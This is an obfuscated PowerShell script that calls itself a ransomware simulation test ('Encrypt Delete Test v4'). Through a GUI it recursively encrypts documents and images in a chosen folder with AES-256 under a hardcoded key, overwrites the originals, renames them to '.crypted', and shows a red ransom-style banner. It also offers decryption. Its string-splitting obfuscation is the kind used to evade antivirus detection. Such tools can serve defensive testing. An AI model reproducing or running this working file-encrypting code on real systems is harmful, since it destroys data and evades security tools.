  sEt-ITem  ('VAriabLe:a'+'wMkh'+'T') ([tYpe]("{3}{8}{6}{5}{10}{0}{2}{7}{4}{1}{9}"-f'.','eRMoD','CI','S','H','eM.sEcUr','st','p','y','E','iTy.CryPTOGrapHY') )  ; $64r8= [type]("{7}{0}{6}{9}{10}{5}{2}{8}{1}{3}{4}"-f 'TEM.S','a','phy.','D','dIngMoDE','gRA','ECUrI','sYS','p','t','y.crypto')  ;  $6l8I =  [TYPe]("{5}{4}{1}{0}{3}{2}" -F'Te','m.','DInG','xt.enCo','YSTE','S');   sEt-Item  vARIabLe:jx9  ([TyPE]("{0}{2}{3}{1}" -f 'SYsT','E','eM','.io.fIL')  ) ; $ozH3=[tyPe]("{0}{6}{3}{7}{2}{5}{8}{1}{4}" -f 'SYst','LOgRESU','.f','W','LT','ORmS.dI','em.wIndO','s','a');    $Ayfog  =[TYPE]("{4}{3}{0}{5}{1}{6}{7}{2}"-F 'Em.','INdOWS','OX','YST','S','w','.fORM','s.MEssageb'); $09D5qj = [type]("{8}{2}{6}{1}{9}{10}{0}{3}{4}{5}{7}"-F'AG','RMs','ND','EbO','XB','utto','ows.Fo','nS','sYsTEM.Wi','.M','EsS') ;  sET  ("h"+"9np") ([TYpe]("{4}{8}{1}{6}{3}{0}{5}{2}{7}" -F'eS','S.fOr','Co','.m','s','SagEBoXi','MS','N','ysteM.WInDOw')  )  ;  ${gL`Ob`AL`:pRO`cESSedF`I`lE}=0;
${k`ey} = ("{1}{0}{2}{3}" -f'nct','e','est@12','3')
${sHA`MaN`Ag`Ed} = &("{2}{1}{0}"-f't','bjec','New-O') ("{4}{1}{9}{5}{8}{10}{12}{7}{6}{0}{2}{11}{3}" -f 'hy.','y','S','naged','S','te','ptograp','y','m.Securi','s','ty','HA256Ma','.Cr')
${aE`S`MA`NaGeD} = &("{0}{1}{2}" -f'New-','O','bject') ("{3}{5}{4}{1}{2}{6}{0}"-f'esManaged','Secu','rit','Sys','em.','t','y.Cryptography.A')
${aes`m`Ana`Ged}."mo`DE" =   $aWMkHT::"c`BC"
${a`ESMaNa`Ged}."PAD`D`InG" =  (  gCi vArIABle:64R8 ).VAlUE::"Ze`ROS"
${A`Esm`An`Aged}."bl`OCK`s`ize" = 128
${aEsMa`NaG`ed}."K`Eysize" = 256
${Aes`mAnAg`ED}."k`EY" = ${s`H`AMAna`GeD}."COMPUte`ha`sH"( $6L8I::"U`TF8".("{2}{1}{0}" -f 'tBytes','e','G').Invoke(${K`eY}))

${ENc`RYPt`Or} = ${aEsm`Ana`Ged}.("{0}{2}{3}{1}" -f'Crea','cryptor','teE','n').Invoke()

Function eNcry`P`T`FilE(${F`Ile}){
  ${PLa`iN`Byt`es} =  (VARiAblE  jx9  -VAl  )::("{2}{0}{1}"-f'adAllByt','es','Re').Invoke(${f`ile})
  ${oU`TPa`TH} = ${FI`Le} + ("{1}{0}" -f 'pted','.cry')

  ${ENCRYP`T`edb`y`TEs} = ${eN`cry`PT`oR}.("{2}{1}{3}{5}{0}{4}"-f'ina','s','Tran','fo','lBlock','rmF').Invoke(${pL`AiN`B`Ytes}, 0, ${PL`AinB`Yt`ES}."Le`NGtH")
  ${encr`YpTEdb`Y`TES} = ${aE`s`man`Aged}."Iv" + ${eNcRyPTEd`B`YTES}

    ( ChIlDiteM variAbLE:Jx9 ).VAlUe::("{0}{2}{1}{3}"-f'Wri','B','teAll','ytes').Invoke(${F`Ile}, ${eNcryP`T`ED`BY`Tes})
  &("{0}{1}{2}" -f'Write-','H','ost') ('Enc'+'rypt '+'an'+'d '+'o'+'ve'+'rwrite '+'to'+' '+"$File")
  &("{1}{0}{2}"-f'name','Re','-Item') ${FI`Le} ${oUTP`A`TH}
  &("{1}{0}{3}{2}" -f'i','Wr','Host','te-') ('Re'+'n'+'ame '+'to'+' '+"$outPath")
  &("{0}{2}{1}" -f 'Wr','-Host','ite')
  if ( ( iTEm vARiABlE:jx9).valUe::("{0}{1}"-f 'Exist','s').Invoke(${oU`TpA`Th})) {
    ${GLobaL:`PROc`es`sE`DF`iLE} += 1
  }

}

Function DECRyP`T`FILe(${fI`LE}){
  ${ciP`H`eRbY`TeS} =  (  vArIABLe jx9).vAluE::("{0}{3}{2}{1}"-f'R','Bytes','ll','eadA').Invoke(${F`iLe})
  ${ouT`P`ATH} = ${fi`LE} -replace ("{0}{1}{2}"-f '.','cr','ypted')

  ${aesM`AN`AgEd}."i`V" = ${cIpHErby`T`Es}[0..15]
  ${deCryp`T`oR} = ${a`E`s`MaNAGEd}.("{0}{2}{1}{3}" -f'C','ateDecrypt','re','or').Invoke()
  ${deCRypt`eDb`Y`TeS} = ${DE`CRypT`or}.("{4}{0}{1}{2}{3}" -f'sfo','rmFina','l','Block','Tran').Invoke(${Ci`pherByT`eS}, 16, ${C`iphe`Rb`yTES}."LeN`gth" - 16)

   (GcI  VArIAblE:jx9).VALUE::("{1}{3}{0}{2}"-f'eAl','W','lBytes','rit').Invoke(${o`UtPATh}, ${D`EC`R`YptEd`Bytes})
  .("{1}{2}{0}"-f'ost','Wr','ite-H') ('D'+'e'+'crypt '+'t'+'o '+"$outPath")
  .("{2}{1}{0}"-f'Host','rite-','W')
}

Function bANn`Er{
  ("{0}{1}"-f '<','html>') | &("{2}{1}{0}"-f 'ile','t-F','Ou') -FilePath ("{3}{1}{0}{2}"-f 'm','up.ht','l','pop')
  ("{0}{1}"-f '<hea','d>') | &("{0}{1}"-f 'O','ut-File') -FilePath ("{2}{0}{1}{3}" -f'.ht','m','popup','l') -Append
  ("{4}{5}{3}{1}{0}{2}{7}{6}"-f '<','estv4','/ti','>EncryptDelT','<titl','e','e>','tl') | .("{0}{1}" -f 'Out-','File') -FilePath ("{0}{2}{1}" -f'popu','tml','p.h') -Append
  ("{4}{0}{1}{3}{2}"-f'gco','lor=re','>','d','<body b') | .("{2}{0}{1}" -f 'il','e','Out-F') -FilePath ("{1}{0}{2}"-f'up.h','pop','tml') -Append
  ("{16}{15}{12}{7}{5}{14}{6}{0}{4}{17}{2}{9}{10}{11}{3}{13}{8}{1}" -f '>[Encry','r><br>','Testv4','f','ptDe','white','b','=','><b',']','</b><','/','r','ont><br><br','><','nt size=+10 colo','<fo','l') | &("{2}{0}{1}" -f 't-','File','Ou') -FilePath ("{1}{2}{0}" -f'l','po','pup.htm') -Append
  ("{4}{2}{1}{12}{14}{7}{8}{15}{10}{19}{13}{0}{6}{3}{9}{11}{16}{18}{17}{5}"-f 'e','ze=+10 color=whit','ont si','<u>CANNOT<','<f','<br><br>',' ','ou','r ant','/u','-virus ','> detect thi','e>','twar','Y','i','s test<','nt>','/fo','sof') | .("{1}{2}{0}"-f'ile','Out-','F') -FilePath ("{0}{3}{2}{1}" -f 'pop','l','p.htm','u') -Append
  ("{1}{0}"-f'r>','<b') | .("{2}{0}{1}" -f't-F','ile','Ou') -FilePath ("{1}{2}{0}"-f'.html','popu','p') -Append
  ("{0}{1}" -f'<b','r>') | &("{2}{1}{0}"-f 'ile','-F','Out') -FilePath ("{1}{2}{0}"-f'.html','pop','up') -Append
  ("{2}{5}{3}{1}{0}{4}"-f 'y:','e','<br>E','on K',' ','ncrypti') + ${K`eY}  | &("{1}{0}{2}"-f 'i','Out-F','le') -FilePath ("{1}{2}{0}{3}"-f 'htm','popu','p.','l') -Append
  ("{1}{4}{5}{2}{0}{3}"-f 'ile','<br>Encryp',' F',': ','te','d') + ${g`LobAl`:PRoC`es`SEdfiLe} | &("{0}{2}{1}"-f 'Out','le','-Fi') -FilePath ("{3}{1}{0}{2}"-f'.htm','up','l','pop') -Append
  ("{0}{1}{2}"-f'<br>','Path',': ') + ${fOlDeRBr`oWSER`DI`AloG}."SElE`CtED`pA`TH" | .("{1}{2}{0}" -f'le','Ou','t-Fi') -FilePath ("{1}{0}{2}"-f'up.ht','pop','ml') -Append
  ("{1}{0}" -f'r>','<b') + (&("{2}{1}{0}" -f'e','et-Dat','G')).("{1}{2}{0}" -f 'ring','To','St').Invoke(("{3}{5}{2}{1}{0}{4}"-f's t','hh:mm:s','yyy ','MM/','t','dd/y')) | .("{1}{0}" -f 't-File','Ou') -FilePath ("{2}{1}{0}"-f'l','htm','popup.') -Append
  ("{0}{1}"-f '<','br>') | &("{0}{2}{1}"-f 'Out-F','le','i') -FilePath ("{1}{2}{0}" -f'ml','popu','p.ht') -Append
  ("{1}{0}" -f'r>','<b') | .("{2}{0}{1}"-f't-','File','Ou') -FilePath ("{0}{2}{1}"-f 'p','ml','opup.ht') -Append
  ("{1}{0}" -f'/body>','<') | &("{0}{2}{1}" -f'O','le','ut-Fi') -FilePath ("{3}{0}{1}{2}"-f'opu','p.htm','l','p') -Append
  ("{0}{1}"-f '</ht','ml>') | .("{1}{0}{2}" -f'Fil','Out-','e') -FilePath ("{0}{2}{1}" -f'p','ml','opup.ht') -Append
  .("{2}{4}{0}{1}{3}"-f'e','ssio','I','n','nvoke-Expr') (("{2}{0}{1}"-f 'tm','l','.1rKpopup.h'))."rEpl`ACe"('1rK',[strinG][cHaR]92)
  .("{1}{0}{2}" -f 'e-Ho','Writ','st') ""
  &("{0}{1}{2}" -f'Writ','e-Hos','t') ("{0}{2}{1}{3}"-f'Encr','ption ','y','Key: ') ${K`EY}
  .("{0}{1}{2}{3}"-f 'W','r','ite-H','ost') ("{0}{3}{4}{1}{2}"-f 'E','yp','ted File: ','n','cr') ${GLo`BAL:PRo`C`eSSed`F`i`le}
  .("{2}{0}{1}" -f't','e-Host','Wri') ""
  &("{3}{1}{0}{2}"-f'os','rite-H','t','W') ("{2}{0}{1}{3}"-f 'ion',' com','Operat','pleted!')
}

.("{2}{0}{1}" -f 'p','e','Add-Ty') -AssemblyName ("{5}{0}{1}{4}{3}{2}"-f'y','stem.','.Forms','ows','Wind','S')
.("{1}{0}" -f 'Type','Add-') -AssemblyName ("{4}{2}{0}{1}{3}" -f '.','Dra','m','wing','Syste')

${oBj`Fo`RM} = .("{1}{0}{2}"-f'-O','New','bject') ("{0}{3}{5}{2}{4}{1}{6}" -f 'System.W','o','For','indo','ms.F','ws.','rm')
${OBJFO`Rm}."A`UtoS`IZE" = ${tr`Ue}
${Obj`F`oRM}."t`eXT" = ("{0}{2}{5}{4}{1}{3}" -f '[Encr','es','ypt ','t v4]','ete T','Del')
${o`BjfO`RM}."s`TArTp`O`SITI`oN" = ("{2}{3}{1}{0}"-f 'een','rScr','Cent','e')

${OBJ`lA`BEl} = &("{2}{1}{0}" -f 'ct','ew-Obje','N') ("{3}{5}{6}{1}{0}{4}{7}{2}"-f 'ws.','o','el','System','Form','.Win','d','s.lab')
${OBJla`B`el}."t`EXT" = ('[E'+'n'+'crypt '+'De'+'lete'+' '+'Te'+'st '+'v4]'+'
'+'Si'+'m'+'ulate '+'r'+'a'+'nsomwa'+'re '+'e'+'nc'+'ryption '+'op'+'erat'+'ion
'+'By'+' '+'Eddie'+' '+'Chu'+' '+'eddi'+'echu.android@gma'+'il.c'+'om'+'
'+'Please'+' '+'downloa'+'d'+' '+'th'+'e '+'origina'+'l '+'and'+' '+'late'+'st'+' '+'ve'+'r'+'sion '+'f'+'rom '+'ht'+'tps://g'+'ithub'+'.'+'com/e'+'dd'+'ie'+'chu/Encrypt-Dele'+'t'+'e-T'+'est'+'
'+'
'+'V'+'ersi'+'o'+'n'+' '+'v4.0.0'+' '+"(22/Sept/2021)`r`n
This "+'too'+'l '+'e'+'nc'+'rypts '+'- '+'ove'+'rw'+'rites '+'- '+'renam'+'e'+'s '+'t'+'he '+'f'+'ile '+'u'+'n'+'der '+'select'+'e'+'d '+'fol'+'der '+'a'+'nd '+('it'+'On'+'9s ')."Re`P`laCE"('On9',[StRing][CHAr]39)+"subfolder(s))`r`n
[Caution]
You "+'u'+'se '+'t'+'his '+'tool'+' '+'co'+'mp'+'letely'+' '+'a'+'t '+'your'+' '+'o'+'wn '+'risk'+'.'+'
')
${objL`Ab`eL}."A`UTo`siZe" = ${t`RUE}
${obJf`Orm}."co`N`TRols".("{1}{0}"-f'dd','A').Invoke(${ob`JLaB`EL})

.("{1}{2}{0}" -f'st','Write','-Ho') ${obj`La`BEL}."t`EXT"
 
${O`BJ`cOMbObOx}=&("{2}{1}{0}"-f 'ect','ew-Obj','N') ("{1}{5}{0}{4}{6}{2}{3}" -f 'ows','Syst','orms.combo','box','.','em.Wind','F')
${o`BJCoMBOb`ox}."TE`xT" = ("{3}{0}{1}{2}"-f'sel','e','ct','Please ')
${O`B`Jcombo`BOX}."ItE`ms".("{1}{0}" -f 'dd','a').Invoke(("{1}{0}"-f 'ncrypt','E'))
${OB`J`cOMBO`BOX}."I`TEms".("{1}{0}"-f'd','ad').Invoke(("{0}{1}{2}"-f'Decr','y','pt'))
${ob`JcoMB`o`Box}."t`oP" = (${o`BJ`LabEl}."HE`igHt" + 10)
${o`BJf`ORM}."CO`Ntro`lS".("{1}{0}"-f 'd','Ad').Invoke(${Ob`jC`OmbOB`OX})
 
${buTTO`N_`ClI`cK}=
{ 
  if ($objCombobox.SelectedItem -eq "Encrypt"){
    .("{1}{2}{3}{0}"-f'ost','Wr','ite-','H') ("{0}{1}" -f 'en','crypt')
    ${foLDERBroW`sErd`ia`L`OG} = .("{2}{1}{0}"-f'bject','-O','New') ("{11}{8}{2}{5}{7}{9}{0}{1}{3}{6}{4}{10}" -f 'ows.F','orms.FolderBrowse','W','r','ialo','i','D','n','em.','d','g','Syst')
    ${foLD`er`BRO`ws`Er`d`IALOg}."sE`LecTeD`PATH" = (&("{1}{0}{2}{3}"-f '-Loc','Get','a','tion'))."p`ATH"
    If ($FolderBrowserDialog.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK){
      .("{1}{2}{0}"-f 'e-Host','W','rit') ${F`oLd`erB`R`oWsErdi`ALog}."SEL`ectEdpA`TH"
      &("{2}{1}{0}"-f '-Host','e','Writ')
      &("{0}{2}{3}{1}"-f 'G','hildItem','e','t-C') ${Fol`DERB`R`OwSErD`Ia`l`Og}."S`El`E`cTeDPATh" -Recurse -Attributes ("{1}{0}{2}"-f 'Direct','!','ory') -Include ("{1}{0}"-f 'oc','*.d'),("{0}{1}"-f'*.do','cx'),("{0}{1}"-f'*.x','ls'),("{0}{1}{2}" -f '*','.xls','x'),("{0}{1}" -f'*.t','xt'),("{1}{0}"-f'rtf','*.'),("{0}{1}"-f '*.p','df'),("{1}{0}"-f 'g','*.jp'),("{1}{0}" -f'g','*.jpe'),("{0}{1}"-f '*','.gif'),("{0}{1}" -f'*','.bmp'),("{0}{1}"-f '*.pn','g') | .('%') {&("{1}{2}{0}"-f 'ryptFile','En','c') ${_}."FUL`L`NaMe"}
      .("{0}{1}"-f'Banne','r')
    }
  }
  elseif ($objCombobox.SelectedItem -eq "Decrypt"){
    &("{2}{1}{0}" -f 'Host','e-','Writ') ("{1}{2}{0}"-f 't','decr','yp')
    ${folD`erB`RoWsERDi`AlOg} = .("{1}{2}{0}" -f 'ct','New-O','bje') ("{8}{0}{7}{3}{5}{2}{9}{4}{1}{10}{6}"-f'te','a','s.Fol','nd','erDi','ows.Form','og','m.Wi','Sys','derBrows','l')
    ${fo`l`der`BR`OWSeRD`IaloG}."selEcT`eDpA`TH" = (.("{2}{1}{0}" -f'n','-Locatio','Get'))."Pa`Th"
    If ($FolderBrowserDialog.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK){
      .("{2}{1}{0}{3}"-f 'te-Hos','ri','W','t') ${Fo`Ld`eRb`RoWS`eRDia`l`OG}."Se`LE`Cted`PATH"
      .("{2}{1}{0}"-f'ost','rite-H','W')
      .("{3}{1}{4}{0}{2}"-f'ildIt','et-','em','G','Ch') ${fold`ER`BrOWseR`dIalOG}."Se`leCt`ed`patH" -Recurse -Attributes ("{0}{3}{2}{1}"-f '!D','y','r','irecto') -Include ("{2}{0}{1}" -f 'yp','ted','*.cr') | .('%') {.("{3}{1}{2}{0}"-f'File','cr','ypt','De') ${_}."Fu`ll`NamE"}
      &("{0}{2}{1}" -f'W','Host','rite-') ("{4}{3}{2}{1}{5}{0}"-f '!',' complete','n','peratio','O','d')
    }
  }
  Else{
    [System.Windows.Forms.MessageBox]::Show('Please select option',"[Encrypt Delete Test v4]",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)
  }
}  

${OB`jbU`TT`On} = .("{2}{1}{0}"-f 't','Objec','New-') ("{0}{4}{2}{5}{6}{1}{3}"-f'System.Wi','tt','For','on','ndows.','m','s.Bu')
${O`BjBut`Ton}."t`oP" = (${o`BjlaBEL}."H`EiG`ht" + 50)
${oB`jb`UTt`ON}."te`XT" = ("{2}{7}{0}{5}{9}{1}{4}{8}{3}{6}" -f 't','o','Ch',' t','c','o p','he test','oose a folder or network drive ','ess','r')
${o`BjBut`TON}."au`To`sIZe" = ${Tr`Ue}
${Ob`jBuTT`on}.("{2}{1}{0}"-f 'ick','Cl','Add_').Invoke(${BUTtO`N_`CLI`ck})
${ObJ`FORm}."C`O`NTrOlS".("{0}{1}" -f 'Ad','d').Invoke(${o`BjB`Utt`ON})

${Obj`FOrM}.("{2}{3}{0}{1}" -f'wDialo','g','Sh','o').Invoke()

${AESM`An`AGEd}.("{1}{2}{0}" -f 'e','Dis','pos').Invoke()
${sHAM`Ana`GeD}.("{0}{1}{2}"-f'D','ispos','e').Invoke()

